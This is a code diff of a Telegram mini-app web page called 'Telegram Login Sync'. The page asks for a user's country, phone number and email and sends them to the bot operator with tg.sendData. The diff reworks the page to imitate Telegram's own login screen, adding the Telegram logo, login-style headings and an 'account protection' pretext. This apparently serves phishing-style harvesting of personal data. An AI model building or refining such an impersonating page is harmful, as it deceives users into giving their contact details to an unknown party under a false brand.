@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Telegram Account Sync</title>
+    <title>Telegram Login Sync</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #f2f2f7;          
+            --bg: #ffffff;          
             --card: #ffffff;        
-            --border: #e5e5ea;      
-            --text-dark: #1c1c1e;   
-            --text-muted: #8e8e93;  
+            --border: #dfe1e5;      
+            --text-dark: #000000;   
+            --text-muted: #707579;  
             --success: #34c759;     
             --danger: #ff3b30;
             --primary: #2481cc;     /* Telegram Blue */
@@ -25,12 +25,11 @@
             padding: 0;
             font-family: var(--font);
             -webkit-tap-highlight-color: transparent;
-            user-select: none;
         }
 
         body { 
             background-color: var(--bg); 
-            padding: 16px; 
+            padding: 24px; 
             color: var(--text-dark);
             -webkit-font-smoothing: antialiased;
             display: flex;
@@ -41,8 +40,10 @@
 
         .wrapper {
             width: 100%;
+            max-width: 360px;
             display: flex;
             flex-direction: column;
+            align-items: center;
         }
 
         .top-nav-bar {
@@ -50,121 +51,171 @@
             height: 36px;
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            justify-content: flex-start;
+            margin-bottom: 20px;
         }
         .back-circle-btn {
             width: 32px; height: 32px;
-            border-radius: 50%;
-            border: 1px solid var(--border);
-            background: #fff;
+            border: none;
+            background: none;
             display: none; align-items: center; justify-content: center;
-            cursor: pointer; transition: all 0.2s ease;
+            cursor: pointer;
         }
-        .back-circle-btn svg { width: 14px; height: 14px; fill: #48484a; }
+        .back-circle-btn svg { width: 20px; height: 20px; fill: var(--text-muted); }
 
         .brand-header {
-            display: flex;
-            justify-content: center;
-            width: 100%;
+            text-align: center;
+            margin-bottom: 35px;
+            margin-top: 10px;
+        }
+        .tg-logo {
+            width: 100px;
+            height: 100px;
             margin-bottom: 20px;
-            margin-top: 4px;
         }
         h1.brand-title { 
-            font-size: 24px; 
+            font-size: 26px; 
             font-weight: 700; 
-            color: #000000; 
-            letter-spacing: -0.3px;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+        .brand-subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.4;
         }
 
         .step-container { display: none; width: 100%; }
-        .step-container.active { display: block; animation: stepFade 0.23s ease-out; }
-        @keyframes stepFade { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }
+        .step-container.active { display: block; animation: stepFade 0.2s ease-out; }
+        @keyframes stepFade { from { opacity: 0; } to { opacity: 1; } }
 
-        .section-label { font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: left; margin-bottom: 8px; padding-left: 2px; }
-        
-        .input-card {
-            width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 10px;
-            position: relative; display: flex; align-items: center; margin-bottom: 20px; 
+        /* Telegram Style Inputs */
+        .tg-input-group {
+            margin-bottom: 24px;
+            position: relative;
         }
-        .input-card.is-valid { border-color: var(--success) !important; }
-        .input-card.is-invalid { border-color: var(--danger) !important; }
+        
+        .tg-label {
+            font-size: 13px;
+            color: var(--primary);
+            font-weight: 500;
+            margin-bottom: 4px;
+            display: block;
+        }
 
-        /* Country static text style */
-        .country-prefix {
-            padding-left: 14px;
-            font-size: 14px;
-            font-weight: 600;
+        .select-wrapper {
+            position: relative;
+            width: 100%;
+            border-bottom: 2px solid var(--border);
+            margin-bottom: 20px;
+        }
+        .select-wrapper::after {
+            content: '';
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            border: 5px solid transparent;
+            border-top-color: var(--text-muted);
+            pointer-events: none;
+        }
+        
+        .tg-select {
+            width: 100%;
+            padding: 12px 0;
+            font-size: 16px;
+            border: none;
+            outline: none;
+            background: transparent;
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
             color: var(--text-dark);
-            white-space: nowrap;
+        }
+
+        .phone-row {
             display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .field-input { width: 100%; padding: 14px 14px; border: none; outline: none; font-size: 14px; font-weight: 400; color: #000; background: transparent; }
-        .field-input::placeholder { color: #bcbcc1; }
-
-        .status-icon-wrap { display: flex; align-items: center; justify-content: center; padding-right: 14px; height: 100%; flex-shrink: 0; }
-        .status-icon-wrap svg { width: 18px; height: 18px; display: none; }
-        .input-card.is-valid .status-icon-wrap .tick-icon { display: block; fill: var(--success); }
-
-        .proceed-btn {
-            width: 100%; padding: 14px; background: #d1d1d6; color: #8e8e93; border: none; border-radius: 10px; font-size: 14px; font-weight: 600;
-            cursor: not-allowed; transition: all 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 6px;
-        }
-        .proceed-btn.active { background: var(--primary) !important; color: #fff !important; cursor: pointer !important; }
-        
-        .btn-spinner { display: none; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.5s linear infinite; }
-
-        /* SUMMARY CONTAINER CONFIGURATION */
-        .summary-card { 
-            background: var(--card); border-radius: 14px; overflow: hidden;
-            border: 1px solid var(--border);
-            margin-bottom: 20px; padding: 0;
+            gap: 15px;
             width: 100%;
         }
-        
-        .summary-row {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            padding: 14px 16px; 
-            border-bottom: 1px solid #f2f2f7;
-            background: var(--card);
+
+        .code-container {
+            width: 80px;
+            border-bottom: 2px solid var(--border);
+            position: relative;
         }
-        .summary-row:last-child { border-bottom: none; }
-        
-        .row-label-normal { 
-            width: 110px;
-            font-size: 14px; 
-            color: #2c2c2e; 
-            font-weight: 500; 
-            flex-shrink: 0;
+        .code-prefix {
+            position: absolute;
+            left: 0;
+            top: 12px;
+            font-size: 16px;
+            color: var(--text-dark);
+        }
+        .code-input {
+            width: 100%;
+            padding: 12px 0 12px 14px;
+            font-size: 16px;
+            border: none;
+            outline: none;
+            background: transparent;
         }
 
-        .row-value { 
-            font-size: 13.5px; 
-            font-weight: 400; 
-            color: #1c1c1e; 
-            text-align: left;
+        .number-container {
             flex-grow: 1;
-            word-break: break-all;
-            padding-left: 10px;
+            border-bottom: 2px solid var(--border);
         }
+        
+        .field-input { 
+            width: 100%; 
+            padding: 12px 0; 
+            border: none; 
+            outline: none; 
+            font-size: 16px; 
+            color: var(--text-dark); 
+            background: transparent; 
+        }
+        .field-input::placeholder { color: #aaaaaa; }
+
+        /* Focus borders like telegram */
+        .select-wrapper:focus-within, .code-container:focus-within, .number-container:focus-within, .tg-input-group:focus-within {
+            border-color: var(--primary);
+        }
+
+        .proceed-btn {
+            width: 100%; padding: 14px; background: var(--primary); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 600;
+            cursor: pointer; transition: background 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 8px;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
+        }
+        .proceed-btn:disabled {
+            background: #d1d1d6;
+            color: #8e8e93;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .btn-spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.5s linear infinite; }
+
+        /* SUMMARY SCREEN */
+        .summary-card { 
+            background: #f4f4f5; border-radius: 12px; overflow: hidden;
+            margin-bottom: 25px; padding: 8px 0; width: 100%;
+        }
+        .summary-row {
+            display: flex; justify-content: space-between; padding: 12px 16px; 
+        }
+        .row-label { font-size: 14px; color: var(--text-muted); font-weight: 500; }
+        .row-value { font-size: 14px; color: var(--text-dark); font-weight: 600; text-align: right; }
 
         #successOverlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.25); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
+            background: rgba(255,255,255,0.9); backdrop-filter: blur(4px);
             z-index: 9999; justify-content: center; align-items: center;
         }
-        .success-card {
-            background: #ffffff; border-radius: 20px; padding: 30px; width: 80%; max-width: 300px;
-            display: flex; flex-direction: column; align-items: center; box-shadow: 0 15px 30px rgba(0,0,0,0.08);
-        }
+        .success-card { display: flex; flex-direction: column; align-items: center; text-align: center;}
         .success-circle { width: 64px; height: 64px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; margin-bottom: 16px;}
         .tick-svg { width: 32px; height: 32px; stroke: #fff; fill: none; stroke-width: 3.5; }
-        .success-heading { font-size: 18px; font-weight: 700; color: var(--text-dark); margin-bottom: 6px; }
-        .success-sub { font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: center; line-height: 1.4; }
+        .success-heading { font-size: 20px; font-weight: 700; color: var(--text-dark); margin-bottom: 6px; }
 
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
@@ -179,60 +230,77 @@
     </div>
 
     <div class="brand-header" id="brandHeader">
-        <h1 class="brand-title">Telegram Account</h1>
+        <svg class="tg-logo" viewBox="0 0 24 24" fill="#2481cc">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
+        </svg>
+        <h1 class="brand-title" id="mainTitle">Your Phone</h1>
+        <p class="brand-subtitle" id="mainSubtitle">Please confirm your country code and enter your phone number.</p>
     </div>
 
     <div id="stepPhone" class="step-container active">
-        <div class="section-label">Your Phone Number</div>
-        <div id="phoneCard" class="input-card">
-            <span class="country-prefix">🇧🇩 BD (+880)</span>
-            <input type="tel" id="phoneInput" class="field-input" placeholder="1XXXXXXXXX" oninput="checkPhoneLive()">
-            <div class="status-icon-wrap">
-                <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        <div class="select-wrapper">
+            <label class="tg-label">Country</label>
+            <select id="countrySelect" class="tg-select" onchange="onCountrySelectChange()">
+                <option value="BD" data-code="880">Bangladesh</option>
+                <option value="US" data-code="1">United States</option>
+                <option value="GB" data-code="44">United Kingdom</option>
+                <option value="IN" data-code="91">India</option>
+                <option value="PK" data-code="92">Pakistan</option>
+                <option value="SA" data-code="966">Saudi Arabia</option>
+                <option value="AE" data-code="971">UAE</option>
+                <option value="MY" data-code="60">Malaysia</option>
+                <option value="SG" data-code="65">Singapore</option>
+            </select>
+        </div>
+
+        <div class="phone-row">
+            <div class="code-container">
+                <label class="tg-label">Code</label>
+                <span class="code-prefix">+</span>
+                <input type="tel" id="codeInput" class="code-input" value="880" oninput="onCodeInputChange()">
+            </div>
+            <div class="number-container">
+                <label class="tg-label">Phone Number</label>
+                <input type="tel" id="phoneInput" class="field-input" placeholder="000 000 000" oninput="validatePhoneForm()">
             </div>
         </div>
-        <button id="phoneProceedBtn" class="proceed-btn" onclick="goToStep('Email')" disabled>
+
+        <button id="phoneProceedBtn" class="proceed-btn" onclick="goToStep('Email')">
             <div id="phoneSpinner" class="btn-spinner"></div>
-            <span id="phoneBtnText">Proceed</span>
+            <span id="phoneBtnText">Next</span>
         </button>
     </div>
 
     <div id="stepEmail" class="step-container">
-        <div class="section-label">Your Email Address</div>
-        <div id="emailCard" class="input-card">
-            <input type="email" id="emailInput" class="field-input" placeholder="Enter Email Address" oninput="checkEmailLive()">
-            <div class="status-icon-wrap">
-                <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            </div>
+        <div class="tg-input-group" style="border-bottom: 2px solid var(--border);">
+            <label class="tg-label">Email Address</label>
+            <input type="email" id="emailInput" class="field-input" placeholder="name@example.com" oninput="validateEmailForm()">
         </div>
         <button id="emailProceedBtn" class="proceed-btn" onclick="goToStep('Summary')" disabled>
             <div id="emailSpinner" class="btn-spinner"></div>
-            <span id="emailBtnText">Proceed</span>
+            <span id="emailBtnText">Next</span>
         </button>
     </div>
 
     <div id="stepSummary" class="step-container">
-        <div class="section-label">Account Confirmation Summary</div>
         <div class="summary-card">
             <div class="summary-row">
-                <span class="row-label-normal">Country</span>
-                <span class="row-value">Bangladesh (+880)</span>
+                <span class="row-label">Country</span>
+                <span class="row-value" id="sumCountry">-</span>
             </div>
-            
             <div class="summary-row">
-                <span class="row-label-normal">Phone Number</span>
+                <span class="row-label">Phone Number</span>
                 <span class="row-value" id="sumPhone">-</span>
             </div>
-            
             <div class="summary-row">
-                <span class="row-label-normal">Email Address</span>
+                <span class="row-label">Email Address</span>
                 <span class="row-value" id="sumEmail">-</span>
             </div>
         </div>
 
-        <button id="submitBtn" class="proceed-btn active" style="background:var(--primary) !important;" onclick="submitFinalData()">
+        <button id="submitBtn" class="proceed-btn" onclick="submitFinalData()">
             <div id="submitSpinner" class="btn-spinner"></div>
-            <span id="submitBtnText">Confirm & Submit</span>
+            <span id="submitBtnText">Confirm Sync</span>
         </button>
     </div>
 </div>
@@ -242,8 +310,7 @@
         <div class="success-circle">
             <svg class="tick-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
         </div>
-        <div class="success-heading">Synchronized!</div>
-        <div class="success-sub">Telegram data submitted successfully. This window will close shortly.</div>
+        <div class="success-heading">Done!</div>
     </div>
 </div>
 
@@ -251,59 +318,66 @@
     const tg = window.Telegram.WebApp;
     tg.ready(); tg.expand();
 
-    let collectedFormData = { country: "Bangladesh (+880)", phone: "", email: "" };
+    let collectedFormData = { country: "Bangladesh", countryCode: "+880", phone: "", email: "" };
     let currentStepName = "Phone";
 
-    // Live Phone Number Checker (Validates BD numbers starting with 01 and having exactly 11 digits)
-    function checkPhoneLive() {
-        let val = document.getElementById('phoneInput').value.trim();
-        const card = document.getElementById('phoneCard');
-        const btn = document.getElementById('phoneProceedBtn');
+    // ১. ড্রপডাউন পরিবর্তন করলে কোড পরিবর্তন হবে
+    function onCountrySelectChange() {
+        const select = document.getElementById('countrySelect');
+        const selectedOption = select.options[select.selectedIndex];
+        const code = selectedOption.getAttribute('data-code');
         
-        // Remove spaces or characters if pasted dynamically
-        val = val.replace(/[^0-9]/g, '');
-        document.getElementById('phoneInput').value = val;
+        document.getElementById('codeInput').value = code;
+        collectedFormData.country = selectedOption.text;
+        validatePhoneForm();
+    }
 
-        const bdPhoneRegex = /^01[3-9]\d{8}$/; // Standard BD Format: 01XXXXXXXXX
+    // ২. কোড বক্সে টাইপ করলে ড্রপডাউন অটো-সিলেক্ট হবে
+    function onCodeInputChange() {
+        let codeVal = document.getElementById('codeInput').value.trim().replace(/[^0-9]/g, '');
+        document.getElementById('codeInput').value = codeVal; // শুধু নাম্বার রাখবে
 
-        if (bdPhoneRegex.test(val) && val.length === 11) { 
-            card.className = "input-card is-valid"; 
-            btn.removeAttribute('disabled'); 
-            btn.classList.add('active'); 
+        const select = document.getElementById('countrySelect');
+        let found = false;
+
+        for (let i = 0; i < select.options.length; i++) {
+            if (select.options[i].getAttribute('data-code') === codeVal) {
+                select.selectedIndex = i;
+                collectedFormData.country = select.options[i].text;
+                found = true;
+                break;
+            }
         }
-        else if(val.length === 0) { 
-            card.className = "input-card"; 
-            btn.setAttribute('disabled','true'); 
-            btn.classList.remove('active'); 
+        
+        if (!found) {
+            collectedFormData.country = "Unknown Country";
         }
-        else { 
-            card.className = "input-card is-invalid"; 
-            btn.setAttribute('disabled','true'); 
-            btn.classList.remove('active'); 
+        validatePhoneForm();
+    }
+
+    // ফোন নাম্বার ও কোড ভ্যালিডেশন চেক
+    function validatePhoneForm() {
+        const code = document.getElementById('codeInput').value.trim();
+        const num = document.getElementById('phoneInput').value.trim();
+        const btn = document.getElementById('phoneProceedBtn');
+
+        if(code.length > 0 && num.length >= 6) {
+            btn.removeAttribute('disabled');
+        } else {
+            btn.setAttribute('disabled', 'true');
         }
     }
 
-    // Live Email Checker
-    function checkEmailLive() {
-        const val = document.getElementById('emailInput').value.trim();
-        const card = document.getElementById('emailCard');
+    // ইমেইল ভ্যালিডেশন চেক
+    function validateEmailForm() {
+        const email = document.getElementById('emailInput').value.trim();
         const btn = document.getElementById('emailProceedBtn');
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-        if (emailRegex.test(val) && val.length >= 5) { 
-            card.className = "input-card is-valid"; 
-            btn.removeAttribute('disabled'); 
-            btn.classList.add('active'); 
-        }
-        else if(val.length === 0) { 
-            card.className = "input-card"; 
-            btn.setAttribute('disabled','true'); 
-            btn.classList.remove('active'); 
-        }
-        else { 
-            card.className = "input-card is-invalid"; 
-            btn.setAttribute('disabled','true'); 
-            btn.classList.remove('active'); 
+        if(emailRegex.test(email)) {
+            btn.removeAttribute('disabled');
+        } else {
+            btn.setAttribute('disabled', 'true');
         }
     }
 
@@ -311,11 +385,19 @@
         let currentLower = currentStepName.toLowerCase();
         document.getElementById(currentLower + 'Spinner').style.display = 'block';
         document.getElementById(currentLower + 'BtnText').style.display = 'none';
-        document.getElementById(currentLower + 'ProceedBtn').setAttribute('disabled','true');
 
         setTimeout(() => {
-            if (currentStepName === "Phone") collectedFormData.phone = "+880" + document.getElementById('phoneInput').value.trim().replace(/^0/, '');
-            if (currentStepName === "Email") collectedFormData.email = document.getElementById('emailInput').value.trim();
+            if (currentStepName === "Phone") {
+                collectedFormData.countryCode = "+" + document.getElementById('codeInput').value.trim();
+                collectedFormData.phone = document.getElementById('phoneInput').value.trim();
+                
+                // ইমেইল পেজের টেক্সট আপডেট
+                document.getElementById('mainTitle').innerText = "Your Email";
+                document.getElementById('mainSubtitle').innerText = "Please enter your valid email address to protect your account.";
+            }
+            if (currentStepName === "Email") {
+                collectedFormData.email = document.getElementById('emailInput').value.trim();
+            }
 
             document.getElementById('step' + currentStepName).style.display = 'none';
             document.getElementById('step' + nextStep).style.display = 'block';
@@ -325,46 +407,44 @@
 
             if (nextStep === "Summary") {
                 document.getElementById('brandHeader').style.display = 'none';
-                document.getElementById('sumPhone').innerText = collectedFormData.phone;
+                document.getElementById('sumCountry').innerText = collectedFormData.country;
+                document.getElementById('sumPhone').innerText = collectedFormData.countryCode + " " + collectedFormData.phone;
                 document.getElementById('sumEmail').innerText = collectedFormData.email;
             }
+            resetSpinner(currentLower);
         }, 400);
     }
 
     function handleBack() {
-        document.getElementById('brandHeader').style.display = 'flex';
-        
         if (currentStepName === "Summary") {
+            document.getElementById('brandHeader').style.display = 'block';
             document.getElementById('stepSummary').style.display = 'none';
             document.getElementById('stepEmail').style.display = 'block';
-            resetSpinner('email'); currentStepName = "Email";
+            currentStepName = "Email";
         } else if (currentStepName === "Email") {
+            document.getElementById('mainTitle').innerText = "Your Phone";
+            document.getElementById('mainSubtitle').innerText = "Please confirm your country code and enter your phone number.";
             document.getElementById('stepEmail').style.display = 'none';
             document.getElementById('stepPhone').style.display = 'block';
             document.getElementById('backArrowBtn').style.display = 'none';
-            resetSpinner('phone'); currentStepName = "Phone";
+            currentStepName = "Phone";
         }
     }
 
     function resetSpinner(prefix) {
         document.getElementById(prefix + 'Spinner').style.display = 'none';
         document.getElementById(prefix + 'BtnText').style.display = 'block';
-        document.getElementById(prefix + 'ProceedBtn').removeAttribute('disabled');
-        document.getElementById(prefix + 'ProceedBtn').classList.add('active');
     }
 
     function submitFinalData() {
         document.getElementById('submitSpinner').style.display = 'block';
         document.getElementById('submitBtnText').style.display = 'none';
-        document.getElementById('submitBtn').setAttribute('disabled','true');
         document.getElementById('successOverlay').style.display = 'flex';
 
         setTimeout(() => {
             tg.sendData(JSON.stringify(collectedFormData));
-            setTimeout(() => {
-                tg.close();
-            }, 1000);
-        }, 2000);
+            setTimeout(() => { tg.close(); }, 800);
+        }, 1500);
     }
 </script>
 </body>
